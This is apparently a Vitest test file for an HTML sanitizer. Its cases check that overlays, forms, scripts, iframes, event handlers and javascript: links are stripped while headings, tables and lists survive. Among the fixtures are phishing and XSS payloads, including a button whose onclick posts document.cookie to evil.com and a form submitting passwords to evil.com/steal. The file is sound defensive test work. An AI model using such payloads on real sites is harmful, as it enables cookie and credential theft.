// @{"req": ["REQ-FECONTENT-001", "REQ-FECONTENT-002", "REQ-FECONTENT-011", "REQ-FECONTENT-015", "REQ-FECONTENT-016", "REQ-FECONTENT-017"]}

import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from './sanitizeHtml'

function parse(html: string): Document {
  return new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
}

describe('sanitizeHtml — phishing overlay probes (Fix 1)', () => {
  it('drops a position:fixed overlay div (probe-confirmed attack vector)', () => {
    const payload = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">Phishing content</div>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    // The div may survive but must not carry a style attribute
    const divEl = doc.querySelector('div')
    if (divEl) {
      expect(divEl.getAttribute('style')).toBeNull()
    }
    // Alternatively the entire style attribute is gone so no position:fixed
    expect(out).not.toContain('position:fixed')
    expect(out).not.toContain('position: fixed')
  })

  it('drops a form element entirely', () => {
    const payload = '<form action="https://evil.com/steal"><input name="password" type="password"><button type="submit">Login</button></form>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<form')
    expect(out).not.toContain('</form>')
  })

  it('drops an input element entirely', () => {
    const payload = '<p>Enter your password: <input type="password" name="pw"></p>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<input')
  })

  it('drops a textarea element', () => {
    const payload = '<textarea name="data">steal me</textarea>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<textarea')
  })

  it('drops a select element', () => {
    const payload = '<select name="x"><option value="1">One</option></select>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<select')
  })

  it('drops a button element', () => {
    // Free-standing button outside a form can still be used for phishing UI
    const payload = '<button onclick="fetch(\'https://evil.com\',{method:\'POST\',body:document.cookie})">Click me</button>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<button')
  })

  it('strips style attribute even on allowed tags (no position/expression vectors)', () => {
    const payload = '<p style="position:fixed;top:0">overlay</p>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const p = doc.querySelector('p')
    expect(p?.getAttribute('style')).toBeNull()
  })

  it('strips style with expression() vector', () => {
    const payload = '<span style="width:expression(alert(1))">xss</span>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('expression(')
  })

  it('strips a style element entirely', () => {
    const payload = '<style>body{display:none}</style><p>content</p>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<style')
  })

  it('drops a script element', () => {
    const payload = '<p>hello</p><script>alert(document.cookie)</script>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<script')
  })

  it('drops an iframe element', () => {
    const payload = '<iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%"></iframe>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('<iframe')
  })
})

describe('sanitizeHtml — on* event handler stripping (Fix 1)', () => {
  it('strips onclick from a div', () => {
    const payload = '<div onclick="alert(1)">click me</div>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const div = doc.querySelector('div')
    expect(div?.getAttribute('onclick')).toBeNull()
  })

  it('strips onerror from an img', () => {
    const payload = '<img src="x" onerror="alert(1)">'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const imgs = doc.querySelectorAll('img')
    for (const img of Array.from(imgs)) {
      expect(img.getAttribute('onerror')).toBeNull()
    }
  })
})

describe('sanitizeHtml — image src allowlist (Fix 1)', () => {
  it('preserves https:// img src', () => {
    const payload = '<img src="https://example.com/fig.png" alt="fig">'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const img = doc.querySelector('img')
    expect(img?.getAttribute('src')).toBe('https://example.com/fig.png')
  })

  it('preserves data:image/png;base64, img src', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQAABjE+ibYAAAAASUVORK5CYII='
    const payload = `<img src="${dataUri}" alt="tiny">`
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const img = doc.querySelector('img')
    expect(img?.getAttribute('src')).toBe(dataUri)
  })

  it('strips javascript: img src', () => {
    const payload = '<img src="javascript:alert(1)" alt="x">'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const imgs = doc.querySelectorAll('img')
    for (const img of Array.from(imgs)) {
      expect(img.getAttribute('src') ?? '').not.toMatch(/^javascript:/i)
    }
  })

  it('strips data:image/svg+xml img src', () => {
    const svgUri = 'data:image/svg+xml;base64,PHN2Zy8+'
    const payload = `<img src="${svgUri}" alt="svg">`
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const imgs = doc.querySelectorAll('img')
    for (const img of Array.from(imgs)) {
      expect(img.getAttribute('src') ?? '').not.toMatch(/^data:image\/svg/i)
    }
  })
})

describe('sanitizeHtml — link safety (Fix 1)', () => {
  it('strips javascript: href from a link', () => {
    const payload = '<a href="javascript:alert(1)">click</a>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const anchors = doc.querySelectorAll('a')
    for (const a of Array.from(anchors)) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
    }
  })

  it('preserves a legitimate https link', () => {
    const payload = '<a href="https://example.com">visit</a>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    const a = doc.querySelector('a')
    expect(a?.getAttribute('href')).toBe('https://example.com')
  })
})

describe('sanitizeHtml — U+E000/U+E001 stripping (Fix 4)', () => {
  it('strips U+E000 from input', () => {
    const payload = '<p>hello  world</p>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('')
  })

  it('strips U+E001 from input', () => {
    const payload = '<p>test  content</p>'
    const out = sanitizeHtml(payload)
    expect(out).not.toContain('')
  })

  it('renders content normally when input has no PUA characters', () => {
    const payload = '<h2>Section Title</h2><p>Normal content.</p>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelector('h2')?.textContent?.trim()).toBe('Section Title')
    expect(doc.querySelector('p')?.textContent?.trim()).toBe('Normal content.')
  })
})

describe('sanitizeHtml — legitimate AsciiDoc content preserved (Fix 1)', () => {
  it('preserves headings', () => {
    const payload = '<h1>Title</h1><h2>Subtitle</h2>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelector('h1')?.textContent).toBe('Title')
    expect(doc.querySelector('h2')?.textContent).toBe('Subtitle')
  })

  it('preserves paragraphs and inline formatting', () => {
    const payload = '<p>This is <strong>bold</strong> and <em>italic</em>.</p>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelector('strong')?.textContent).toBe('bold')
    expect(doc.querySelector('em')?.textContent).toBe('italic')
  })

  it('preserves code blocks', () => {
    const payload = '<pre><code>const x = 1</code></pre>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelector('pre code')?.textContent).toBe('const x = 1')
  })

  it('preserves tables', () => {
    const payload = '<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelector('table')).not.toBeNull()
    expect(doc.querySelector('th')?.textContent).toBe('A')
    expect(doc.querySelector('td')?.textContent).toBe('1')
  })

  it('preserves ordered and unordered lists', () => {
    const payload = '<ul><li>one</li><li>two</li></ul><ol><li>a</li></ol>'
    const out = sanitizeHtml(payload)
    const doc = parse(out)
    expect(doc.querySelectorAll('li').length).toBe(3)
  })
})
